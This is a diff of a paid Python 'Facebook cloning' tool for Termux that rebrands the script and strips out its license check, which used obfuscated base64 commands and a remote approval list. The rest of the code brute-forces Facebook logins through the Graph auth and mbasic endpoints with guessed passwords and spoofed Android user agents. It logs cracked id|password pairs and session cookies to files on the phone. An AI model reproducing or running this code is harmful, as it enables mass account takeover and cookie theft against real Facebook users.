@@ -1,5 +1,5 @@
 #!/usr/bin/python
-#Original written By Muhmmad Sarfraz
+#BARKI Teach my wp 03188939326
 
 import os,zlib
 
@@ -69,293 +69,33 @@ def randBuildvsskj():
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
 
-sys.stdout.write('\x1b]2; NEWXJ\x07')
+sys.stdout.write('\x1b]2; L-S\x07')
 S = '\033[1;37m'
 A = '\x1b[38;5;208m'
 R = '\x1b[38;5;46m'
 F = '\x1b[38;5;48m'
 Z = '\033[1;33m'
 head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
-logo=("""\033[1;37m
+logo =                                          """            
 
- $$$$$$\   $$$$$$\  $$$$$$\ $$$$$$$$\ 
-$$  __$$\ $$  __$$\ \_$$  _|$$  _____|
-$$ /  $$ |$$ /  \__|  $$ |  $$ |      
-$$$$$$$$ |\$$$$$$\    $$ |  $$$$$\    
-$$  __$$ | \____$$\   $$ |  $$  __|   
-$$ |  $$ |$$\   $$ |  $$ |  $$ |      
-$$ |  $$ |\$$$$$$  |$$$$$$\ $$ |      
-\__|  \__| \______/ \______|\__|      
-                                      
-                                      
-                                      
  
-----------------------------------------------
- Author    : Asif Sakhani 
- Status    : PAID
- Version   : 4.2 \033[1;37m
- Github    : NOT Found
-----------------------------------------------""")
-def line():
-	print(f'\033[1;37m------------------------------------------------')
-
-from requests import api
-x = open(api.__file__,'r').read()
-if "print" in x:
-    clr()
-elif "sys.stdout.write" in x:
-    clr()
-else:
-    pass
-from requests import sessions
- 
-x = open(sessions.__file__,'r').read()
-if "print" in x:
-    clr()
-elif "sys.stdout.write" in x:
-    clr()
-else:
-    pass
-from requests import models
-x = open(models.__file__,'r').read()
-if "print" in x:
-    clr()
- 
-elif "sys.stdout.write" in x:
-    clr()
-else:
-    pass
-try:
-    import mechanize
-except:
-    os.system(base64.b64decode(base64.b64decode("Y0dsd0lHbHVjM1JoYkd3Z2JXVmphR0Z1YVhwbElENGdMMlJsZGk5dWRXeHM=")))
-    
-    
-def xox(m):
-    for x in m + '\n':
-        sys.stdout.write(x)
-        sys.stdout.flush()
-        time.sleep(0.07)
-
-def p(x):
-    print(x)
-
-xxxx="[FBAN/"+"FB4A;FBAV/"+"61.0.0.15.69;FBBV/"+"20748125;FBDM/"+"{density=1.0,width=600,height=976};FBLC/"+"es_LA;FBCR/"+"MOVISTAR;FBMF/"+"Rockchip;FBBD/"+"K5-3G;FBPN/"+"com.facebook.katana;FBDV/"+"K5-3G;FBSV/"+"5.1.1;nullFBCA/"+"x86:armeabi-v7a;]"
-#ua = "[FBAN/FB4A;FBAV/107.26.45.69;FBBV/61714298;FBDM/{density=2.5,width=859,height=2059};FBLC/en_GB;FBRV/11130038;FBCR/GLOBE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI;FBSV/5.8;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/135.62.83.5;FBBV/51324647;FBDM/{density=1.1,width=832,height=2554};FBLC/en_GB;FBRV/24264444;FBCR/GLOBE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI;FBSV/9.7;FBOP/1;FBCA/arm64-v8a:;]"
-folder_path = '/sdcard/NEWXJ'
-try:
-    os.makedirs(folder_path, exist_ok=True)
-except:
-    pass
-
-oks=[]
-cps=[]
-loop=0
-
-#__________________[ APP ]__________________#
-import os,base64,sys,re
-try:
-    import rich
-except:
-    os.system("pip install rich")
-    import rich
-from rich import print as rp
-from rich.panel import Panel
-from datetime import datetime
+ ░▒▓██████▓▒░ ░▒▓███████▓▒░▒▓█▓▒░▒▓████████▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░        
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░        
+░▒▓████████▓▒░░▒▓██████▓▒░░▒▓█▓▒░▒▓██████▓▒░   
+░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░        
+░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░        
+░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░▒▓█▓▒░        
+                                               
+                                               
 
 
-
-
-K1=str(os.getuid())
-K2=str(os.getgid())
-num_key="h".join(K1+K2)
-cm=num_key.encode("ASCII")
-cmr=base64.b64encode(cm)
-cm2=str(cmr)
-#####KEY NAME ######
-kx=cm2.replace("b","NEXJ")
-####################
-key=kx.upper()
-##### APPROVE URL #####
-
-url=base64.b64decode(b'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NLQkVSLUNZQkVSL0NvbnRvbC9tYWluL0Z1Y2sudHh0')
-
-######################
-main_url=url.decode("ASCII")
-all_datA=[]
-    #print (logo)
-
-
-def req(team_elite,main_url):
-    try:
-        lx=team_elite.get(main_url)
-        approved=lx.text
-        return approved
-    except:
-        rp("[bold red] Internet Error")
-        sys.exit()
-
-def url_sefty():
-    try:
-        h=open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py","r").read()
-        vx=re.search("print",h)
-        if vx == None:
-            report= "pure_user"
-        else:
-            report= "bypass_user"
-        return report
-    except:
-         pass
-
-def url_sefty2():
-    try:
-        h=open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx/_api.py","r").read()
-        vx=re.search("print",h)
-        if vx == None:
-            report= "pure_user"
-        else:
-            report= "bypass_user"
-        return report
-    except:
-         pass
-
-def key_sefty():
-    global key
-    try:
-        h=open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx/_models.py","r").read()
-        vx=re.search(key,h)
-        if vx == None:
-            report= "pure_user"
-        else:
-            report= "bypass_user"
-        return report
-    except:
-         pass
-
-def key_sefty2():
-    global key
-    try:
-        h=open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py","r").read()
-        vx=re.search(key,h)
-        if vx == None:
-            report= "pure_user"
-        else:
-            report= "bypass_user"
-        return report
-    except:
-         pass
-
-def lisens():
-    global key 
-    ky=key.split('\'')[1]
-    li=ky[5:15]
-    try:
-        open("/data/data/com.termux/files/usr/bin/.sifa.txt","r").read()
-        expired_ck()
-    except:
-        while True:
-            os.system("clear")
-            print(logo)
-            xcx=input("License Key =>")
-            if xcx == li:
-                open("/data/data/com.termux/files/usr/bin/.sifa.txt","a").write("done")
-                expired_ck()
-                break 
-            else:
-                continue 
-    
-def expired_ck():
-    global key,all_datA
-    tita=str(datetime.now()).split(" ")[0]
-    tic=tita.split("-")
-    pure_data=int(tic[0]+tic[1]+tic[2])
-    for x in all_datA:
-        if key in x:
-            
-            break 
-        else:
-            continue
-    
-    NEWXJ=int(x.split("\'|")[1])
-    
-    if pure_data < NEWXJ:
-        main()
-        
-        
-        
-    else:
-        print(" YOUR APPROVAL DATE IS EXPIRED")
-    
-def uninstall_able():
-    try:
-        open("/data/data/com.termux/files/usr/bin/pip","r").read()
-        open("/data/data/com.termux/files/usr/bin/pip3","r").read()
-    except:
-        print(" you are useing Ant-uninstall system ")
-        sys.exit()
-
-def apv():
-    global key,main_url
-    uninstall_able()
-    if "pure_user" == url_sefty():
-        pass
-    elif "bypass_user" == url_sefty():
-        rp(" Trun off your bypass system")
-        sys.exit()
-    
-    if "pure_user" == url_sefty2():
-        pass
-    elif "bypass_user" == url_sefty2():
-        rp(" Trun off your bypass system")
-        sys.exit()
-    
-    
-    if "pure_user" == key_sefty():
-        pass
-    elif "bypass_user" == key_sefty2():
-        rp(" Trun off your bypass system")
-        sys.exit()
-    if "pure_user" == key_sefty():
-        pass
-    elif "bypass_user" == key_sefty2():
-        rp(" Trun off your bypass system")
-        sys.exit()
-    
-    os.system("pip uninstall httpx requests -y")
-    os.system("pip install requests httpx")
-    import httpx
-    team_elite=httpx.Client() 
-    data=req(team_elite,main_url)
-    for dta in data.splitlines():
-        all_datA.append(dta)
-    row=[]
-    for r in data.splitlines():
-        rx=r.split("|")[0]
-        row.append(rx)
-    if key not in row:
-        os.system("clear")
-        print(logo)
-        print("\033[1;31m Your Not Premium User...!\033[1;37m");time.sleep(1)
-        os.system('clear')
-        print(logo)
-        print(' \033[1;31mYour Key Not Registered\033[1;37m')
-        print(f" \033[1;37mYour Key :"+key)
-        line();print (" Tools.. : Facebook Cloning");print (" Massage : Your Key Not Registered");print (" Status  : \033[1;91mTrail\033[1;37m\n \033[1;31m\033[1;42mNote: If You Are Free User Don't Come IB\033[0;0m");line();print(' [+] File crack\n [+] Create ids file\n [+] Public crack\n [+] Random number crack\n [+] Random gmail crack\n [+] Exit menu\n\x1b[1;97m [1] Upgrade Tool To (\x1b[1;95mPremium\x1b[1;37m)')
-        line()
-        input(" Choose Option : ")
-        line()
-        print(" Your Subscription Date Expire")
-        line()
-        url_wa = "https://api.whatsapp.com/send?phone=+923417020930&text="
-        name = input(" Asif Sakhani: ")
-        line()
-        tks = ("Hi Asif Sir, I Need To Buy Your Paid Asif Tools Version 2.1 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+key)
-        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
-        print(' Run :  python Lover.py')
-        line()
-
-    else:
-        lisens()
+\033[1;37m------------------------------------------------
+\033[1;37m Owner   :            ASIF_SAKHANI
+\033[1;37m Facebook:            MR DEVIl
+\033[1;37m Whatsapp :            03417020930
+\033[1;37m Version :            4.2  Paid
+\033[1;37m------------------------------------------------ """
 def clear():
     os.system("clear")
     print(logo)    
@@ -368,44 +108,52 @@ def result(OKs,cps):
         print(' TOTAL OK: %s' % str(len(oks)))
         print(' TOTAL CP: %s' % str(len(cps)))
         print(47*'-')
-        input("Press enter to back NEWXJ Menu ")
+        input("Press enter to back SSB Menu ")
         exit()
 
 def sarfraz():   
     os.system('clear')
     print(logo)
     print(f'[1] File Crack')
-    print(f'[2] Join Whatsapp Group ')
-    print(f'[3] Join Facebook Group ')
-    line()
+    print(f'[2] Public ID Crack')
+    print(f'[3] Random Crack ')
+    print(f'[4] Create File')
+    print(f'[5] Login Tool')
+    print(f'[6] Logout Cookie')
+    print(f'[7] Remove Trash Files ')
+    print(f'[8] Separate Ids')
+    print(f'[9] Remove Duplicate IDs')
+    print(f'[W] Join Whatsapp Group ')
+    print(f'[F] Join Facebook Group ')
+    print('')
     select = input('Select Menu>: ')
     if select =='1':
         method_crack()
     elif select =='2':
         exit(' This is Option Soon available ... ')
-    elif select =='31':
-        random_number()
-    elif select =='41':
-       menu()
-    elif select =='51':
-       login()
-    elif select =='61':
-       remove_Tc()
-    elif select =='71':
-       removef()
-    elif select =='81':
-       sids()
-    elif select =='19':
-       cutter()
-    elif select =='2':
-        os.system('xdg-open https://chat.whatsapp.com/KxLQZN4msGJBqYelid8JXE')
-        pass
     elif select =='3':
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100063307807505&mibextid=ZbWKwL/')
+       random_number()
+    elif select =='4':
+       menu()
+    elif select =='5':
+       login()
+    elif select =='6':
+       remove_Tc()
+    elif select =='7':
+       removef()
+    elif select =='8':
+       sids()
+    elif select =='9':
+       cutter()
+    elif select =='W':
+        os.system('xdg-open https://m.me/asifsakhani/')
+        pass
+    elif select =='F':
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100063307807505&mibextid=ZbWKwL')
     else:
-        print('\nSelect valid option ... ')
-        time.sleep(1)
-        
+        print('\n Select valid option ... ')
+        time.sleep(2)
+        SSB(allkey)
         
 def method_crack():
     global methods
@@ -415,7 +163,7 @@ def method_crack():
     print(f'[3] Method {3}')
     #print(f'[4] Method {4}')
     print(f'[0] Back')
-    line()
+    print('')
     option = input('Select method>: ')
     if option =='1':
         methods.append('methodA')
@@ -458,7 +206,7 @@ class main_crack():
     def methodA(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r {S}[Asif] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r {S}[L-S] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -509,12 +257,12 @@ class main_crack():
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                     print(f"\r{R} [Asif-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/NEWXJ_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/NEWXJ_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/Asif_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
                      print(f"\r{A} [Asif-CP] {sid} | {ps} {S}")
                      cps.append(sid)
-                     open('/sdcard/NEWXJ_CP.txt','a').write(sid+'|'+ps+'\n')
+                     open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -524,7 +272,7 @@ class main_crack():
     def methodC(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r {S}[NEWXJ] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r {S}[Asif] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -573,14 +321,14 @@ class main_crack():
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
-                    print(f"\r{R} [NEWXJ-OK] {sid} | {ps} {S}")
+                    print(f"\r{R} [L-S-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/NEWXJ_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/SSB_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    print(f"\r{A} [NEWXJ-CP] {sid} | {ps} {S}")
+                    print(f"\r{A} [Asif-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/NEWXJ_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/Asif_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -590,7 +338,7 @@ class main_crack():
     def methodB(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r {S}[NEWXJ] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r {S}[Asif] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -639,14 +387,14 @@ class main_crack():
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
-                    print(f"\r{R} [NEWXJ-OK] {sid} | {ps} {S}")
+                    print(f"\r{R} [Asif-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/NEWXJ_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/NEWXJ_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/Asif_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    print(f"\r{A} [NEWXJ-CP] {sid} | {ps} {S}")
+                    #  print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/NEWXJ_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -655,7 +403,7 @@ class main_crack():
 
     def methodD(self, sid, name, psw):
         global oks,cps,loop
-        sys.stdout.write(f"\r {S}[NEWXJ] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+        sys.stdout.write(f"\r {S}[Asif] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
         sys.stdout.flush()
         fs = name.split(' ')[0]
         try:
@@ -673,14 +421,14 @@ class main_crack():
                 session.headers.update({'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': sua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
                 complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                 if 'c_user' in session.cookies.get_dict():
-                    print(f"\r{R} [NEWXJ-OK] {sid} | {ps} {S}")
+                    print(f"\r{R} [Asif-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/NEWXJ_OK.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/SSB_OK.txt','a').write(sid+'|'+ps+'\n')
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
-                    print(f"\r{A} [NEWXJ-CP] {sid} | {ps} {S}")
+                    #print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/NEWXJ_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
                     break
                 else:
                     continue
@@ -697,8 +445,8 @@ class main_crack():
             sl = int(input('How many password do you want to add?: '))
             os.system("clear")
             print(logo)
-            print(f'{S}[Example: first123,last1122,firstlast,last,ETC]')
-            line()
+            print(f'{S} [Example: first123,last1122,firstlast,last,ETC]')
+            print('')
             if sl =='':
                 print('\n Put limit between 1 to 30')
             elif sl > 20:
@@ -792,7 +540,7 @@ def public():
             except KeyError:
                 print(f"\n{S}ID Not Found ...");pass
                 menu()
-        print(f'File Name To Dump Ids. Example /sdcard/SSB.txt') 
+        print(f'File Name To Dump Ids. Example /sdcard/Asif.txt') 
         print(47*"-")
         filepath = input("Put File Name: ")
         os.system('rm -rf %s'%(filepath))
@@ -845,7 +593,7 @@ def follower():
         except KeyError:
             print(f"{A}ID Not Public");time.sleep(1)
             menu()
-        print(f'File Name To Dump Ids. Example /sdcard/NEWXJ.txt') 
+        print(f'File Name To Dump Ids. Example /sdcard/SSB.txt') 
         print(47*"-")
         filepath = input("Put File Name: ")
         os.system('rm -rf %s'%(filepath))
@@ -887,7 +635,7 @@ def sids():
     print('\033[1;37mPut limit between 1 to 10 \033[0;97m')
     limit = int(input('How many links do you want to separate?: '))
     clear()
-    print('\033[1;37mExample: /sdcard/SSB.txt\033[0;97m')
+    print('\033[1;37mExample: /sdcard/Asif.txt\033[0;97m')
     print(47*'-')
     new_save = input('Save new file as: ')
     clear()
@@ -1083,7 +831,7 @@ def p_dump():
         print(f"Total IDs: {totaldmp} ")
         print(f"File Saved To  {filepath} ")
         print(47*'-')
-        input("Press enter to back SSB Menu ")
+        input("Press enter to back L-S Menu ")
         SSB(allkey)
     except Exception as e:
         print("Error : %s"%e) 
@@ -1101,11 +849,12 @@ def cutter():
     print("Removed Successful From File: " + ssb )
     print("New File Saved:" + sarfraz )
     print(47*'-')
-    input(f"{S} Press Enter To Back SSB Menu ")
+    input(f"{S} Press Enter To Back L-S Menu ")
     SSB(allkey)       
     
 def removef():
         os.system('rm -rf self.file');print(f'\n{R}Files Removed Successfully ...')
-        SSB(allkey)     
+        SSB(allkey)            
+ 
 
 sarfraz()
